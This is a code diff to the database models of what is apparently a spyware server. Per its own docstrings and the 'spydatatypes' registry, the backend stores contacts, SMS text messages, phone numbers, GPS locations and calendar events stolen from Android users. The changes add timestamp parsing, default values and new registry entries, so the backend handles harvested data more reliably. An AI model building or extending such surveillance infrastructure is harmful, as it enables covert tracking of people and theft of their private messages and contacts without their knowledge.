@@ -1,6 +1,8 @@
 from app import db
 from app.models import utility
 
+from datetime import date
+
 
 class Contact(db.Model):
     """Models a stolen contact from a user"""
@@ -29,21 +31,27 @@ class Contact(db.Model):
             birthday=contact_data_dict.get("birthday")
         )
         # Create related text messages
-        for message in contact_data_dict.get("textMessages"):
-            text_message = TextMessage(
-                user_id=contact.user_id,
-                contact_id=contact.contact_id,
-                android_given_id=message.get("id"),
-                # TODO: Might need long to date conversion
-                time_stamp=message.get("timeStamp"),
-                body=message.get("body"),
-                address=message.get("address"),
-                inbound=message.get("inbound")
-            )
-            db.session.add(text_message)
+        for message in contact_data_dict.get("textMessages", []):
+            try:
+                time_stamp = date.fromtimestamp(int(message.get("timeStamp")))
+
+                text_message = TextMessage(
+                    user_id=contact.user_id,
+                    contact_id=contact.contact_id,
+                    android_given_id=message.get("id"),
+                    # TODO: Might need long to date conversion
+                    time_stamp=time_stamp,
+                    body=message.get("body"),
+                    address=message.get("address"),
+                    inbound=message.get("inbound")
+                )
+                db.session.add(text_message)
+            except ValueError:
+                # TODO: Silent error, caller of data handler wont know that this failed 
+                pass
 
         # Create related phone numbers
-        for number in contact_data_dict.get("phoneNumbers"):
+        for number in contact_data_dict.get("phoneNumbers", []):
             phone_number = PhoneNumber(
                 contact_id=contact.contact_id,
                 number=number
@@ -67,7 +75,7 @@ class TextMessage(db.Model):
 
     # TODO: I dont know whether BigInteger is the same as long
     android_given_id = db.Column(db.BigInteger, nullable=False)
-    time_stamp = db.Column(db.Data, nullable=False)
+    time_stamp = db.Column(db.Date, nullable=False)
     body = db.Column(db.String(64), nullable=False)
     address = db.Column(db.String(64), nullable=False)
     inbound = db.Column(db.Boolean, default=False)
@@ -98,7 +106,6 @@ class PhoneNumber(db.Model):
     def __repr__(self):
         return "<PhoneNumber {}.{} {}>".format(self.phonenumber_id, self.contact_id, self.number)
 
-
 class Location(db.Model):
     """Models gps data from a user"""
     __tablename__ = "location"
@@ -113,11 +120,13 @@ class Location(db.Model):
     def userdata_post_handler(user_id, location_data_dict):
         """Adds posted userdata to database"""
         # Create contact
+
+        time_stamp = date.fromtimestamp(int(location_data_dict.get("time")))
         location = Location(
             user_id=int(user_id),
             longitude=location_data_dict.get("longitude"),
             latitude=location_data_dict.get("latitude"),
-            time_stamp=location_data_dict.get("time"),
+            time_stamp=time_stamp,
         )
         db.session.add(location)
         db.session.commit()
@@ -163,4 +172,10 @@ class CalendarEvent(db.Model):
     def __repr__(self):
         return "<CalendarEvent {}: {}>".format(self.calendar_id, self.title)
 
-spydatatypes = {"Contact": Contact, "Location": Location, "CalendarEvent": CalendarEvent}
+spydatatypes = {
+    "Contact": Contact,
+    "TextMessage": TextMessage,
+    "PhoneNumber": PhoneNumber,
+    "Location": Location,
+    "CalendarEvent": CalendarEvent,
+}
